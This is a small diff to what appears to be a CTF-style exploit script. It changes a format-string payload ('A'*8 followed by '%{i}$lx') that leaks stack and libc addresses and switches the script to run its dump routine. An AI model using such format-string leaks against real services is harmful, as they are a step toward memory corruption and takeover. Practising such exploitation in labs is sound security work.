@@ -51,7 +51,7 @@ def dump():
         send_fsb_payload(payload)
 
         # fsb2 libc leak
-        payload = b""
+        payload = b"A" * 8
         payload += f"#%{i}$lx#".encode()
         send_fsb_payload(payload)
         io.recvuntil(b"#")
@@ -105,5 +105,5 @@ def main():
 
 
 if __name__ == "__main__":
-    main()
-    # dump()
+    # main()
+    dump()
